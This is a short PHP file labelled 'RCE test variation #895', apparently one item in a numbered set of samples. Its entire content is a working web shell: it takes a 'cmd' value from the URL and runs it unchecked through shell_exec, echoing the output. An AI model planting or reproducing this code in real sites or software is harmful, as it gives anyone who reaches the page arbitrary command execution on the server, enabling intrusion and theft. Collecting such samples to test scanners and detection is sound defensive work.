<?php
// RCE test variation #895
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>